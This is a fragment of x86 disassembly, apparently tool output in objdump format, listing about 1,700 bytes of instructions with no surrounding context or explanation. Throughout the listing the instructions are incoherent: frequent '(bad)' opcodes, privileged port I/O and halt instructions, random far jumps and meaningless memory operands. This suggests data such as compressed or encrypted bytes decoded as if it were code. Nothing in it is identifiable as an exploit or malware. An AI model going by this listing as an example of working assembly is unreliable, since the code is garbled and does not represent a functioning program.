  411cce:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cd0:	push   esi
  411cd1:	jae    0x411d2a
  411cd3:	xor    BYTE PTR [esi-0x6603a2b4],0xdf
  411cda:	stos   DWORD PTR es:[edi],eax
  411cdb:	jg     0x411d13
  411cdd:	push   ebx
  411cde:	retf   
  411cdf:	out    0xa1,al
  411ce1:	outs   dx,BYTE PTR ds:[esi]
  411ce2:	jg     0x411cd1
  411ce4:	test   BYTE PTR [esi],bl
  411ce6:	pop    edx
  411ce7:	ret    
  411ce8:	loop   0x411ceb
  411cea:	(bad)  
  411cec:	or     eax,0x21afaf19
  411cf1:	xchg   DWORD PTR [eax-0x29089ba6],edx
  411cf7:	sahf   
  411cf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411cf9:	imul   edi,DWORD PTR [ecx+0x8606440],0xfe2c545f
  411d03:	mov    ah,0x5
  411d05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d06:	(bad)  
  411d07:	cwde   
  411d08:	fimul  DWORD PTR [edx+0x1c1f56b0]
  411d0e:	push   0x4f67893a
  411d13:	cmp    BYTE PTR fs:[esi],dh
  411d16:	xchg   edi,eax
  411d17:	(bad)  
  411d18:	std    
  411d19:	dec    esi
  411d1a:	es int 0x48
  411d1d:	stos   DWORD PTR es:[edi],eax
  411d1e:	(bad)  
  411d20:	jmp    0x6ec6:0xea948d8b
  411d27:	repz sub eax,0xd258208a
  411d2d:	push   ebx
  411d2e:	jge    0x411d63
  411d30:	lods   al,BYTE PTR gs:[esi]
  411d32:	sbb    eax,DWORD PTR [edi-0x40d5be02]
  411d38:	mov    WORD PTR [edx],?
  411d3a:	adc    DWORD PTR [edx-0x14d2d658],ebx
  411d40:	ret    
  411d41:	mov    cl,0x2f
  411d43:	mov    esp,0x19700a3a
  411d48:	outs   dx,BYTE PTR ds:[esi]
  411d49:	xchg   ebx,eax
  411d4a:	cmp    DWORD PTR [eax+ecx*8+0x51],esi
  411d4e:	fst    QWORD PTR [esi-0x40]
  411d51:	mov    dh,0xc6
  411d53:	daa    
  411d54:	fsubr  QWORD PTR [edx+0x1b]
  411d57:	jne    0x411d7c
  411d59:	dec    esp
  411d5a:	ror    DWORD PTR [eax+0x35],0xd6
  411d5e:	in     al,dx
  411d5f:	out    0x2d,eax
  411d61:	data16 aad 0xa0
  411d64:	cmp    DWORD PTR [esi+0xd],0x813d1dbb
  411d6b:	add    DWORD PTR [ebp+0x46],esp
  411d6e:	add    cl,BYTE PTR [ebx+ebp*4-0x5a]
  411d72:	cwde   
  411d73:	sbb    DWORD PTR [edx+0x2a],ebp
  411d76:	out    0x82,eax
  411d78:	and    DWORD PTR [esi+0x19051d29],eax
  411d7e:	xor    DWORD PTR [ebp-0x5c],ecx
  411d81:	adc    ebx,DWORD PTR [eax]
  411d83:	sbb    esi,esp
  411d85:	popa   
  411d86:	dec    esi
  411d87:	dec    ebx
  411d88:	sub    eax,0x622bfa00
  411d8d:	and    ebp,0x8a05cfe6
  411d93:	mov    bl,BYTE PTR [ecx-0x5cc39c2c]
  411d99:	mov    BYTE PTR [eax+0x3e],dl
  411d9c:	lahf   
  411d9d:	and    DWORD PTR [edi+0x345423fc],edx
  411da3:	or     DWORD PTR [ecx+0x54],0x34
  411da7:	mov    al,0xbe
  411da9:	push   esp
  411daa:	call   0x649a3ef9
  411daf:	pop    es
  411db0:	jmp    0x69db:0x7dec5b3
  411db7:	add    BYTE PTR [ebx],bl
  411db9:	mov    WORD PTR [eax],?
  411dbb:	fbld   TBYTE PTR [edx]
  411dbd:	(bad)  
  411dbe:	leave  
  411dbf:	and    DWORD PTR [esi+ebp*1],0xccebfb04
  411dc6:	repnz (bad) 
  411dc8:	sub    BYTE PTR [esi+0x26e41430],al
  411dce:	(bad)  
  411dcf:	push   eax
  411dd0:	adc    BYTE PTR ds:0xbdffa971,0x78
  411dd7:	(bad)  
  411dd8:	xchg   BYTE PTR [edi-0x60f71c96],dh
  411dde:	stos   BYTE PTR es:[edi],al
  411ddf:	adc    BYTE PTR ds:0x3dbb5c3,0x2a
  411de6:	push   esi
  411de7:	xor    DWORD PTR [edi+0x2333f7c1],esi
  411ded:	sbb    BYTE PTR [esi+0xb],ch
  411df0:	pusha  
  411df1:	dec    ebp
  411df2:	mov    dh,BYTE PTR [ebx]
  411df4:	je     0x411e22
  411df6:	repz and eax,0xc0112c98
  411dfc:	sub    dl,al
  411dfe:	in     al,dx
  411dff:	dec    BYTE PTR [ebp+0x39f11485]
  411e05:	pusha  
  411e06:	data16 jae 0x411db7
  411e09:	sub    ah,BYTE PTR [ecx]
  411e0b:	inc    edi
  411e0c:	aam    0xce
  411e0e:	fisub  DWORD PTR [ebx+0x34]
  411e11:	jge    0x411e51
  411e13:	jb     0x411e35
  411e15:	inc    edi
  411e16:	(bad)  
  411e17:	lods   eax,DWORD PTR ds:[esi]
  411e18:	ds xchg edi,eax
  411e1a:	xchg   esi,eax
  411e1b:	in     eax,dx
  411e1c:	stos   BYTE PTR es:[edi],al
  411e1d:	pop    ss
  411e1e:	ins    BYTE PTR es:[edi],dx
  411e1f:	or     dl,ah
  411e21:	xchg   esp,eax
  411e22:	retf   
  411e23:	cs cld 
  411e25:	enter  0x7d13,0xc1
  411e29:	add    BYTE PTR [ebp-0x116eab2a],bl
  411e2f:	sbb    al,0x4e
  411e31:	div    edi
  411e33:	ret    0x504f
  411e36:	push   ss
  411e37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e38:	shl    bl,1
  411e3a:	jg     0x411e41
  411e3c:	xor    DWORD PTR [eax],ebp
  411e3e:	aaa    
  411e3f:	cmp    ebx,DWORD PTR [edi-0x64]
  411e42:	lods   eax,DWORD PTR ds:[esi]
  411e43:	icebp  
  411e44:	in     al,dx
  411e45:	mov    al,0xaf
  411e47:	sbb    ebp,DWORD PTR [edx]
  411e49:	push   es
  411e4a:	sbb    al,0xca
  411e4c:	int    0x32
  411e4e:	test   BYTE PTR [ebx+0x288039d8],0xa1
  411e55:	sti    
  411e56:	push   cs
  411e57:	cmc    
  411e58:	outs   dx,BYTE PTR ds:[esi]
  411e59:	lahf   
  411e5a:	int    0xb3
  411e5c:	mov    ah,0xc1
  411e5e:	adc    al,0x52
  411e60:	pushf  
  411e61:	enter  0x407b,0xdf
  411e65:	and    ebp,eax
  411e67:	sti    
  411e68:	fisub  WORD PTR [ecx]
  411e6a:	aaa    
  411e6b:	pop    ebx
  411e6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e6d:	push   ebx
  411e6e:	and    bh,dl
  411e70:	(bad)  
  411e71:	sbb    BYTE PTR [ecx],al
  411e73:	mov    al,0x6c
  411e75:	inc    BYTE PTR [ebx+0x2d]
  411e78:	loop   0x411ecb
  411e7a:	push   edx
  411e7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e7c:	xchg   esi,eax
  411e7d:	sub    ah,dh
  411e7f:	idiv   DWORD PTR [edx]
  411e81:	sub    BYTE PTR [edx+0x390dc53b],ch
  411e87:	neg    DWORD PTR [ecx+eiz*8+0x3c0c663f]
  411e8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e8f:	push   cs
  411e90:	mov    dh,0x94
  411e92:	and    esp,DWORD PTR [edi-0x262c71ec]
  411e98:	xchg   edx,eax
  411e99:	dec    ecx
  411e9a:	xor    BYTE PTR [esi+0xf],cl
  411e9d:	adc    ecx,DWORD PTR [ecx]
  411e9f:	lds    ebx,FWORD PTR [eax]
  411ea1:	add    edi,edx
  411ea3:	dec    edi
  411ea4:	inc    ebp
  411ea5:	jnp    0x411e39
  411ea7:	icebp  
  411ea8:	cmp    ebx,DWORD PTR [edx+0x6eb9c1ba]
  411eae:	push   0x94c0e881
  411eb3:	into   
  411eb4:	push   ecx
  411eb5:	fcom   QWORD PTR [esi+0x53]
  411eb8:	lock or DWORD PTR [edi-0x3987fcb5],edx
  411ebf:	scas   al,BYTE PTR es:[edi]
  411ec0:	stos   BYTE PTR es:[edi],al
  411ec1:	aad    0x47
  411ec3:	imul   ebx,DWORD PTR [ecx+edi*1+0x20],0x5e
  411ec8:	aad    0x7
  411eca:	sahf   
  411ecb:	push   es
  411ecc:	data16 cld 
  411ece:	ror    ebp,0xce
  411ed1:	jo     0x411e9b
  411ed3:	sbb    eax,0x5ba04759
  411ed8:	rcr    DWORD PTR [ebp-0x1dfbe04d],cl
  411ede:	mov    cl,0x7a
  411ee0:	lds    ebp,FWORD PTR [eax]
  411ee2:	pop    ecx
  411ee3:	les    ebp,FWORD PTR [ebp+0x54]
  411ee6:	test   cl,0x58
  411ee9:	jo     0x411e82
  411eeb:	les    ebx,FWORD PTR [ebp+0x63]
  411eee:	nop
  411eef:	aam    0x84
  411ef1:	pop    eax
  411ef2:	fnstcw WORD PTR [edx-0x2b30aa96]
  411ef8:	cmp    DWORD PTR [esi+0x10],esi
  411efb:	mov    esp,0x48faa9e3
  411f00:	daa    
  411f01:	pop    es
  411f02:	mov    cl,0xcf
  411f04:	les    ebx,FWORD PTR ds:0x64b2cba4
  411f0a:	sub    ebp,DWORD PTR ds:0x7053b1ff
  411f10:	sbb    BYTE PTR [ecx],0xad
  411f13:	sbb    bl,BYTE PTR [esp+edi*2-0x5ab455e2]
  411f1a:	sbb    bl,BYTE PTR [eax+0x6977ece6]
  411f20:	xor    al,0x34
  411f22:	add    al,0x4b
  411f24:	pop    es
  411f25:	loopne 0x411f03
  411f27:	sub    eax,0x50d5e669
  411f2c:	fldcw  WORD PTR [edx]
  411f2e:	in     eax,dx
  411f2f:	and    eax,0x23e7eb09
  411f34:	test   DWORD PTR [esi+0x4],ebp
  411f37:	dec    ebp
  411f38:	nop
  411f39:	mov    ebx,0x39b810ca
  411f3e:	jne    0x411f4b
  411f40:	pop    esp
  411f41:	cmp    ecx,DWORD PTR [eax]
  411f43:	adc    DWORD PTR [ebx+ebx*4+0x3e],edx
  411f47:	lahf   
  411f48:	jmp    0x411f7e
  411f4a:	int3   
  411f4b:	sbb    WORD PTR [ecx-0xf],0xffd6
  411f50:	ins    DWORD PTR es:[edi],dx
  411f51:	add    edi,edi
  411f53:	sti    
  411f54:	dec    esp
  411f55:	mov    ah,0xa5
  411f57:	stos   DWORD PTR es:[edi],eax
  411f58:	ins    DWORD PTR es:[edi],dx
  411f59:	ins    BYTE PTR es:[edi],dx
  411f5a:	pop    ecx
  411f5b:	mov    WORD PTR [ecx+eiz*1-0x414fb829],ds
  411f62:	adc    al,0x1d
  411f64:	mov    ds:0x558d5acf,al
  411f69:	pop    es
  411f6a:	and    DWORD PTR [ecx-0x5a],esi
  411f6d:	inc    esp
  411f6e:	cdq    
  411f6f:	scas   al,BYTE PTR es:[edi]
  411f70:	adc    esp,esi
  411f72:	jmp    0x411f4f
  411f74:	pushf  
  411f75:	jbe    0x411ff1
  411f77:	scas   eax,DWORD PTR es:[edi]
  411f78:	je     0x411f04
  411f7a:	adc    eax,0xeae0486b
  411f7f:	(bad)  
  411f80:	sar    DWORD PTR [eax+0x7b],1
  411f83:	and    DWORD PTR [ebx-0x62],esi
  411f86:	aad    0x61
  411f88:	and    al,0x18
  411f8a:	cmc    
  411f8b:	sub    al,0x7f
  411f8d:	cdq    
  411f8e:	out    dx,al
  411f8f:	std    
  411f90:	out    0xb6,eax
  411f92:	mov    ebx,DWORD PTR [eax]
  411f94:	sub    ch,BYTE PTR [eax+0xb2a14e1]
  411f9a:	(bad)  
  411f9b:	(bad)  
  411f9d:	and    DWORD PTR [edi+0x16],eax
  411fa0:	add    DWORD PTR [ebx-0x39],ecx
  411fa3:	lods   eax,DWORD PTR ds:[esi]
  411fa4:	dec    DWORD PTR [ecx]
  411fa6:	ss pusha 
  411fa8:	fidiv  DWORD PTR [eax+edx*2+0x76a26f43]
  411faf:	lods   al,BYTE PTR ds:[esi]
  411fb0:	pop    ebp
  411fb1:	cld    
  411fb2:	sub    dh,BYTE PTR [ecx]
  411fb4:	push   ebp
  411fb5:	lods   eax,DWORD PTR ds:[esi]
  411fb6:	rcr    BYTE PTR [ecx-0x1992e7eb],cl
  411fbc:	jmp    0xf69a:0x4eb0ef4c
  411fc3:	sbb    al,0x14
  411fc5:	jecxz  0x411f54
  411fc7:	or     ah,BYTE PTR [ecx+0x2d]
  411fca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fcb:	mov    ah,0xbd
  411fcd:	push   ecx
  411fce:	mov    ebp,0x70299cc9
  411fd3:	adc    al,0xef
  411fd5:	xor    esp,DWORD PTR [ebx]
  411fd7:	pop    eax
  411fd8:	out    dx,al
  411fd9:	outs   dx,DWORD PTR ds:[esi]
  411fda:	cwde   
  411fdb:	(bad)  [edx-0x3]
  411fde:	cmp    esi,DWORD PTR [edx+edx*8+0x7]
  411fe2:	loopne 0x412039
  411fe4:	sub    DWORD PTR [ecx],ebp
  411fe6:	je     0x412066
  411fe8:	and    cl,BYTE PTR [esi]
  411fea:	push   edx
  411feb:	ins    DWORD PTR es:[edi],dx
  411fec:	jmp    0x412016
  411fee:	xchg   BYTE PTR [edi],cl
  411ff0:	xchg   ebp,eax
  411ff1:	adc    DWORD PTR [esi+0x589f0797],edx
  411ff7:	jnp    0x412032
  411ff9:	leave  
  411ffa:	cmp    ah,BYTE PTR [ecx+0x385c1bac]
  412000:	(bad)  
  412001:	adc    DWORD PTR [esi],edx
  412003:	call   0x6e660dd8
  412008:	test   DWORD PTR [ebx-0x6f],ebp
  41200b:	and    dh,BYTE PTR [eax-0x16375ed6]
  412011:	out    0x38,eax
  412013:	pop    edi
  412014:	scas   eax,DWORD PTR es:[edi]
  412015:	push   ds
  412016:	nop
  412017:	lods   eax,DWORD PTR ds:[esi]
  412018:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412019:	ins    BYTE PTR es:[edi],dx
  41201a:	sbb    BYTE PTR [esi+0x6],cl
  41201d:	out    0x2e,eax
  41201f:	cmp    ah,0xbf
  412022:	in     eax,dx
  412023:	(bad)  
  412024:	out    0x67,al
  412026:	jg     0x412047
  412028:	pop    DWORD PTR [esi]
  41202a:	or     eax,DWORD PTR [ebx-0x28338ea]
  412030:	and    DWORD PTR [edi+0x4bfeb8ac],ebp
  412036:	or     al,0x44
  412038:	rol    BYTE PTR [edi-0x669ffa4d],1
  41203e:	jo     0x412052
  412040:	xor    eax,0x1697c789
  412045:	lods   eax,DWORD PTR ds:[esi]
  412046:	cmp    edx,edi
  412048:	ret    0x2290
  41204b:	sbb    al,0xd
  41204d:	retf   0xff49
  412050:	inc    ebp
  412051:	inc    eax
  412052:	jno    0x412003
  412054:	jne    0x4120bf
  412056:	push   ebx
  412057:	jmp    0xd50e586c
  41205c:	dec    edx
  41205d:	xchg   edx,eax
  41205e:	out    0x6c,eax
  412060:	push   edi
  412061:	adc    BYTE PTR [ebp-0x338c8b86],0xc6
  412068:	jecxz  0x4120e8
  41206a:	xchg   ebp,eax
  41206b:	mov    eax,0xc94a4ec
  412070:	sub    dl,BYTE PTR [edx]
  412072:	sub    BYTE PTR [ebx],0x1c
  412075:	jge    0x4120d3
  412077:	hlt    
  412078:	iret   
  412079:	mul    bl
  41207b:	dec    ecx
  41207c:	test   DWORD PTR [ebx+ecx*1-0x7980e449],esi
  412083:	in     al,dx
  412084:	pop    ebx
  412085:	adc    BYTE PTR [ebp+0x52],dh
  412088:	inc    edi
  412089:	shl    BYTE PTR [esi],0x14
  41208c:	jge    0x41209a
  41208e:	jmp    0x4120f0
  412090:	mov    ebp,0x6d3ddc52
  412095:	int    0xe5
  412097:	popa   
  412098:	adc    ecx,DWORD PTR [ecx-0x435b09a8]
  41209e:	les    ebp,FWORD PTR [esi]
  4120a0:	mov    dh,BYTE PTR [eax]
  4120a2:	enter  0xee9b,0xfd
  4120a6:	fwait
  4120a7:	push   edx
  4120a8:	or     eax,0xb10979d9
  4120ad:	jne    0x412035
  4120af:	mov    ds:0x3be53773,eax
  4120b4:	xor    esi,edi
  4120b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120b7:	aad    0xb2
  4120b9:	pop    ecx
  4120ba:	gs pop es
  4120bc:	lock xlat BYTE PTR ds:[ebx]
  4120be:	inc    esi
  4120bf:	dec    edx
  4120c0:	xchg   edx,eax
  4120c1:	daa    
  4120c2:	retf   0xe242
  4120c5:	sbb    BYTE PTR [eax-0x4d],dh
  4120c8:	or     BYTE PTR [edx],al
  4120ca:	add    al,0x1e
  4120cc:	int3   
  4120cd:	push   eax
  4120ce:	bound  edi,QWORD PTR [edi-0x67e0df30]
  4120d4:	jbe    0x4120f2
  4120d6:	je     0x412134
  4120d8:	pop    esp
  4120d9:	lahf   
  4120da:	nop
  4120db:	jmp    0x41211c
  4120dd:	mov    ds:0x79ce4157,al
  4120e2:	adc    eax,edi
  4120e4:	dec    eax
  4120e5:	icebp  
  4120e6:	(bad)  
  4120e8:	mov    ah,0x88
  4120ea:	inc    edi
  4120eb:	lods   eax,DWORD PTR ds:[esi]
  4120ec:	icebp  
  4120ed:	fsubr  DWORD PTR [eax+0x76]
  4120f0:	sbb    al,0x99
  4120f2:	xchg   ebp,eax
  4120f3:	sub    ebp,DWORD PTR [ebx+ecx*4-0x45]
  4120f7:	cdq    
  4120f8:	mov    edx,0xd65dd8b4
  4120fd:	sar    BYTE PTR ds:0xa0c5739c,0xe6
  412104:	daa    
  412105:	push   esp
  412106:	inc    edi
  412107:	or     DWORD PTR [ebx],0x84a4373c
  41210d:	and    DWORD PTR [ecx],esi
  41210f:	fs out 0x55,eax
  412112:	call   0xf2b5:0x4b20c24a
  412119:	es cld 
  41211b:	test   DWORD PTR [ebx+0x32100b40],ebx
  412121:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412122:	stc    
  412123:	or     ebx,edi
  412125:	sahf   
  412126:	pop    ss
  412127:	sbb    bh,bl
  412129:	push   ebx
  41212a:	xor    al,0x54
  41212c:	cmp    BYTE PTR [edx+edi*8-0x6fcda19b],dl
  412133:	fiadd  DWORD PTR ds:0x975edd72
  412139:	dec    DWORD PTR [ecx-0x3a]
  41213c:	fs xchg esi,eax
  41213e:	cmp    ah,BYTE PTR [edx-0x79206608]
  412144:	push   eax
  412145:	xchg   ecx,eax
  412146:	or     eax,0xb2a47ff8
  41214b:	add    bl,BYTE PTR [edi-0x508360f7]
  412151:	sbb    DWORD PTR [ebp+0x13],ebp
  412154:	pop    ebp
  412155:	inc    ebx
  412156:	and    al,BYTE PTR gs:[ebx-0x13]
  41215a:	arpl   WORD PTR [edx+ebp*4+0x5fbfd6f1],dx
  412161:	and    eax,0xa8c6a928
  412166:	test   al,0x26
  412168:	lds    ecx,FWORD PTR [edx]
  41216a:	mov    ch,0x8c
  41216c:	adc    BYTE PTR [ecx+0x40],al
  41216f:	jae    0x412183
  412171:	jbe    0x412120
  412173:	pop    ebp
  412174:	out    0xb9,al
  412176:	(bad)  
  412177:	call   0xe7cb8e0a
  41217c:	mov    esp,0x197ff5cd
  412181:	and    DWORD PTR [ecx],esi
  412183:	vmptrld QWORD PTR [edx+0x46]
  412187:	add    BYTE PTR [ebp-0x5d2b469c],0xa6
  41218e:	xor    ch,ah
  412190:	and    DWORD PTR [esi+esi*8],ecx
  412193:	jae    0x4121d0
  412195:	inc    eax
  412196:	ret    0xdbad
  412199:	cmp    DWORD PTR [ebx+0x34885428],0xffffffe2
  4121a0:	xchg   edi,eax
  4121a1:	jns    0x412170
  4121a3:	jae    0x4121c0
  4121a5:	stos   BYTE PTR es:[edi],al
  4121a6:	repz imul ecx,edx,0x7b
  4121aa:	add    BYTE PTR [edi+0x7dbd7137],ch
  4121b0:	pop    edx
  4121b1:	daa    
  4121b2:	sbb    eax,0x22b50ed8
  4121b7:	sub    eax,0x80c8df01
  4121bc:	jne    0x412206
  4121be:	in     al,0xb4
  4121c0:	mov    esi,0x4eec3a52
  4121c5:	clc    
  4121c6:	test   ebx,ebx
  4121c8:	adc    DWORD PTR [ebx-0x5],esi
  4121cb:	add    al,0x7
  4121cd:	cmp    al,0xaf
  4121cf:	lahf   
  4121d0:	fs jbe 0x41222f
  4121d3:	les    edi,FWORD PTR [ebx-0x1ef7c9d5]
  4121d9:	add    DWORD PTR [edx-0x545fbcaa],0xbb74cce3
  4121e3:	imul   esi,DWORD PTR [esi+0x7107fb1d],0xe
  4121ea:	(bad)  
  4121eb:	outs   dx,BYTE PTR ds:[esi]
  4121ec:	jp     0x412253
  4121ee:	sub    eax,0xee62ba3f
  4121f3:	and    eax,0xd44b888f
  4121f8:	xor    bh,cl
  4121fa:	test   ecx,edi
  4121fc:	loop   0x412198
  4121fe:	or     ch,BYTE PTR [ecx+0x28]
  412201:	jae    0x4121c4
  412203:	out    dx,al
  412204:	rcr    DWORD PTR [ebx+0x6294e48e],cl
  41220a:	scas   eax,DWORD PTR es:[edi]
  41220b:	adc    bh,ch
  41220d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41220e:	cmp    DWORD PTR [ebx-0x2e],ecx
  412211:	xchg   esp,eax
  412212:	jge    0x4121ed
  412214:	mov    cl,0xa5
  412216:	int    0x60
  412218:	call   DWORD PTR ds:0xd4451559
  41221e:	and    eax,0x8f132d86
  412223:	sbb    BYTE PTR [eax],0x63
  412226:	jb     0x4121b5
  412228:	jbe    0x412200
  41222a:	popf   
  41222b:	mov    esp,0xdb138923
  412230:	lock fsub DWORD PTR [esi+0x368af2fe]
  412237:	mov    al,0xa6
  412239:	sub    al,0x91
  41223b:	mov    eax,0xeb89c99f
  412240:	jmp    0x90b8:0x318c8f7e
  412247:	mov    bl,0xc0
  412249:	add    dl,BYTE PTR [ecx]
  41224b:	inc    esp
  41224c:	dec    esp
  41224d:	ficomp WORD PTR [ecx]
  41224f:	mov    bh,0x3c
  412251:	gs out dx,al
  412253:	inc    edi
  412254:	mov    bh,0xa9
  412256:	push   edx
  412257:	jmp    0x1488:0x9f2f949
  41225e:	in     al,0x43
  412260:	mov    BYTE PTR [eax-0x7857c82c],al
  412266:	cwde   
  412267:	xor    DWORD PTR [ebx+0x22],ecx
  41226a:	fcomp  DWORD PTR [esi-0xa]
  41226d:	mov    ebp,0xaeadfabe
  412272:	jp     0x41221a
  412274:	push   0x16
  412276:	push   esp
  412277:	cwde   
  412278:	outs   dx,BYTE PTR ds:[esi]
  412279:	call   0xf73e:0xe3f8d125
  412280:	cmp    DWORD PTR [ebp+0x1ad5d909],0xb9e7e76
  41228a:	xor    eax,DWORD PTR [ebx+0x1f]
  41228d:	ret    0x17be
  412290:	sti    
  412291:	jb     0x41222a
  412293:	jae    0x512f8d17
  412299:	sub    esp,ebx
  41229b:	ret    0x53ea
  41229e:	push   ebp
  41229f:	cmp    eax,0x5a9dff00
  4122a4:	(bad)  
  4122a5:	mov    DWORD PTR [esi+ebx*2],edi
  4122a8:	push   es
  4122a9:	(bad)  
  4122aa:	pusha  
  4122ab:	push   ebp
  4122ac:	push   cs
  4122ad:	push   eax
  4122ae:	push   ss
  4122af:	jg     0x41230c
  4122b1:	or     ebx,ecx
  4122b3:	inc    ecx
  4122b4:	xchg   ebp,eax
  4122b5:	outs   dx,BYTE PTR ds:[esi]
  4122b6:	sbb    edi,DWORD PTR [esi]
  4122b8:	scas   eax,DWORD PTR es:[edi]
  4122b9:	lods   eax,DWORD PTR ds:[esi]
  4122ba:	mov    ds:0x124ca77d,eax
  4122bf:	inc    esi
  4122c0:	test   DWORD PTR [ebx],0xa949d010
  4122c6:	push   eax
  4122c7:	jbe    0x4122cb
  4122c9:	jnp    0x4122d9
  4122cb:	retf   
  4122cc:	ror    ebp,1
  4122ce:	xor    dl,bh
  4122d0:	aas    
  4122d1:	out    0xfb,al
  4122d3:	mov    edx,0x5a58b60d
  4122d8:	mov    ch,0xaa
  4122da:	xor    esp,DWORD PTR [edx+0x55dff3ac]
  4122e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122e1:	push   ecx
  4122e2:	jns    0x4122c8
  4122e4:	ss cmp eax,0x28380639
  4122ea:	add    eax,0xa14ad4a2
  4122ef:	test   eax,0xbfcafbc6
  4122f4:	popa   
  4122f5:	or     ecx,DWORD PTR ds:0xb7a5644f
  4122fb:	pushf  
  4122fc:	nop
  4122fd:	scas   eax,DWORD PTR es:[edi]
  4122fe:	mov    WORD PTR [ecx+0x64],ds
  412301:	jno    0x412315
  412303:	sahf   
  412304:	test   al,0xd5
  412306:	not    edx
  412308:	iret   
  412309:	shl    esi,0xef
  41230c:	cmc    
  41230d:	mov    dl,0xea
  41230f:	das    
  412310:	xchg   BYTE PTR [ebp-0x25717286],bh
  412316:	out    dx,eax
  412317:	scas   eax,DWORD PTR es:[edi]
  412318:	adc    dl,BYTE PTR [esi+0x3edf54ca]
  41231e:	je     0x412337
  412320:	popf   
  412321:	and    al,0x72
  412323:	int    0x6f
  412325:	cdq    
  412326:	push   esi
  412327:	jg     0x41239f
  412329:	dec    edi
  41232a:	cmc    
  41232b:	pop    ebx
  41232c:	icebp  
  41232d:	pop    ebx
  41232e:	inc    edx
  41232f:	popf   
  412330:	lods   al,BYTE PTR ds:[esi]
  412331:	pop    eax
  412332:	shl    DWORD PTR [edx+ebx*1],1
  412335:	mov    eax,ds:0x270cc94d
  41233a:	xor    eax,0xd795e7ee
  41233f:	mov    eax,0xde83d58f
  412344:	scas   al,BYTE PTR es:[edi]
  412345:	nop
  412346:	loopne 0x41239b
  412348:	loop   0x412390
  41234a:	xor    eax,0xf4b159c
  41234f:	das    
  412350:	les    edi,FWORD PTR [eax+ecx*2+0x7eab8474]
  412357:	cs mov cl,0xec
  41235a:	pop    ebp
  41235b:	mov    bl,0x1c
  41235d:	lds    ebp,FWORD PTR [edi+0x70d495a8]
  412363:	jmp    0x4ef104a3
  412368:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412369:	xor    al,0xe9
  41236b:	push   ebx
  41236c:	sbb    edi,edx
  41236e:	xor    DWORD PTR [ecx+0x44f38de5],ebp
  412374:	xchg   esp,eax
  412375:	mov    ebp,0x2d747b87
  41237a:	fnstenv [ebx]
  41237c:	jno    0x4123ad
  41237e:	or     ebp,DWORD PTR [eax-0x10]
  412381:	xchg   ecx,eax
  412382:	add    al,0x85
  412384:	mov    ebx,0x531e713a
  412389:	mov    esi,0xe980e439
  41238e:	(bad)  
  41238f:	clc    
  412390:	adc    BYTE PTR [ecx+0x379713ae],bl
  412396:	mov    esp,0x9115f542
  41239b:	iret   
  41239c:	inc    esp
  41239d:	jae    0x4123de
  41239f:	lahf   
  4123a0:	in     al,0x8b
  4123a2:	pusha  
  4123a3:	adc    eax,0xf926f5ad
  4123a8:	shl    DWORD PTR [ebp-0x30d8eaa1],1
  4123ae:	and    cl,BYTE PTR [ebx+0x3c]
  4123b1:	out    dx,eax
  4123b2:	into   
  4123b3:	jbe    0x41233c
  4123b5:	in     eax,0x25
  4123b7:	mov    ah,0x20
  4123b9:	rcl    BYTE PTR [ebp+0x71c48b0a],1
  4123bf:	fs aaa 
  4123c1:	sbb    cl,ah
  4123c3:	inc    eax
  4123c4:	adc    DWORD PTR [ecx],edx
  4123c6:	out    dx,al
  4123c7:	mov    BYTE PTR [edx-0x31640127],ch
  4123cd:	jmp    DWORD PTR [edx+0x52]
  4123d0:	out    dx,al
  4123d1:	sub    BYTE PTR [ebp+0x1c322f5f],0x20
  4123d8:	dec    ebx
  4123d9:	sbb    DWORD PTR [ebx],ebx
  4123db:	sub    DWORD PTR [ebx],eax
  4123dd:	xchg   BYTE PTR [edi+0x60],ah
  4123e0:	pop    ecx
  4123e1:	add    dl,bl
  4123e3:	loope  0x4123e9
  4123e5:	into   
  4123e6:	push   0xb3eeb916
  4123eb:	imul   ebp,DWORD PTR [ecx+0x537ea2d5],0x61
  4123f2:	push   edi
  4123f3:	mov    edi,DWORD PTR [edi-0x71]
  4123f6:	sub    eax,0xbadc225f
  4123fb:	stos   DWORD PTR es:[edi],eax
  4123fc:	dec    edx
  4123fd:	dec    eax
  4123fe:	mov    bl,0xb6
  412400:	mov    bl,0x30
  412402:	push   esi
  412403:	mov    al,ds:0x91950b41
  412408:	mov    ds:0x83e8edc6,eax
  41240d:	iret   
  41240e:	add    ecx,DWORD PTR [edi]
  412410:	push   0x60
  412412:	inc    ebx
  412413:	std    
  412414:	xchg   ebx,eax
  412415:	push   ss
  412416:	cmp    DWORD PTR [ecx],ecx
  412418:	ror    DWORD PTR [ecx],0xaf
  41241b:	xchg   edi,eax
  41241c:	xor    BYTE PTR [ebx-0x1683f87d],bl
  412422:	jge    0x412493
  412424:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412425:	pop    esp
  412426:	xchg   DWORD PTR [ebx+0x42dff730],ebp
  41242c:	cdq    
  41242d:	mov    esp,0x4abb515b
  412432:	mov    ecx,0x57685bc7
  412437:	inc    edi
  412438:	ds jmp 0xa33829e3
  41243e:	or     BYTE PTR [esi],al
  412440:	ror    ebx,cl
  412442:	xchg   esi,eax
  412443:	std    
  412444:	xchg   esp,eax
  412445:	inc    edi
  412446:	pop    edx
  412447:	div    bl
  412449:	ins    DWORD PTR es:[edi],dx
  41244a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41244b:	jb     0x41246e
  41244d:	enter  0xaa63,0xd7
  412451:	mov    eax,0x5bcaaae7
  412456:	mov    cl,0x85
  412458:	dec    esp
  412459:	fadd   QWORD PTR [ecx+ecx*8+0x14]
  41245d:	repz shl ebx,1
  412460:	test   eax,eax
  412462:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412463:	dec    ebp
  412464:	jno    0x41249b
  412466:	hlt    
  412467:	xchg   ebx,eax
